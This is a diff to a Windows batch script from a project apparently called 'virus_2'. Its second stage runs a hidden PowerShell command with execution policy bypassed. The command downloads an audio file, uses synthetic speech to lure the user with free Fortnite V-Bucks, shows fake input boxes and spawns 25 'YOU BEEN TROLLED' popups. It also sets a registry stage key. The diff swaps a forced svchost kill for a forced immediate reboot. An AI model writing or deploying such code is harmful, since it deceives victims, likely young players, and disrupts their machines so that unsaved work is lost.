@@ -57,7 +57,8 @@ if %currentStage%==1 (
 if %currentStage%==2 (
     :: Everything here is wrapped in one hidden PowerShell command
     :: This runs the Troll Audio, The Input Boxes, and then crashes the PC
-    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$mp3='https://github.com/DanielNov2014/virus_2/raw/refs/heads/main/resources/you-been-trolled.mp3'; $path='$env:TEMP\troll.mp3'; Invoke-WebRequest -Uri $mp3 -OutFile $path; Add-Type -AssemblyName System.Speech,Microsoft.VisualBasic,PresentationCore; $v=New-Object System.Speech.Synthesis.SpeechSynthesizer; $v.Speak('hello user you want vbucks right just type your username in the message box and then click enter'); [Microsoft.VisualBasic.Interaction]::InputBox('Username:','V-Bucks',''); $v.Speak('how much vbucks do you want?'); [Microsoft.VisualBasic.Interaction]::InputBox('Amount:','V-Bucks','13500'); $v.Speak('you been fooled'); $p=New-Object System.Windows.Media.MediaPlayer; $p.Open($path); $p.Volume=1; $p.Play(); Start-Sleep -s 15; for($i=0;$i -lt 25;$i++){ start-process powershell '-WindowStyle Hidden -ExecutionPolicy Bypass -Command [Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\"); [System.Windows.Forms.MessageBox]::Show(\"YOU BEEN TROLLED\", \"LOL\")' }; Start-Sleep -s 2; reg add 'HKCU\Software\Freevbucks' /v 'Stage' /t REG_DWORD /d 3 /f; stop-process -name svchost -force"
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$mp3='https://github.com/DanielNov2014/virus_2/raw/refs/heads/main/resources/you-been-trolled.mp3'; $path='$env:TEMP\troll.mp3'; Invoke-WebRequest -Uri $mp3 -OutFile $path; Add-Type -AssemblyName System.Speech,Microsoft.VisualBasic,PresentationCore; $v=New-Object System.Speech.Synthesis.SpeechSynthesizer; $v.Speak('hello user you want vbucks right just type your username in the message box and then click enter'); [Microsoft.VisualBasic.Interaction]::InputBox('Username:','V-Bucks',''); $v.Speak('how much vbucks do you want?'); [Microsoft.VisualBasic.Interaction]::InputBox('Amount:','V-Bucks','13500'); $v.Speak('you been fooled'); $p=New-Object System.Windows.Media.MediaPlayer; $p.Open($path); $p.Volume=1; $p.Play(); Start-Sleep -s 15; for($i=0;$i -lt 25;$i++){ start-process powershell '-WindowStyle Hidden -ExecutionPolicy Bypass -Command [Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\"); [System.Windows.Forms.MessageBox]::Show(\"YOU BEEN TROLLED\", \"LOL\")' }; Start-Sleep -s 2; reg add 'HKCU\Software\Freevbucks' /v 'Stage' /t REG_DWORD /d 3 /f; REM stop-process -name svchost -force"
+    shutdown /r /f /t 0
     exit /b
 )
 
@@ -88,3 +89,4 @@ if %currentStage%==3 (
 if %currentStage%==4 (
     exit
 )
+
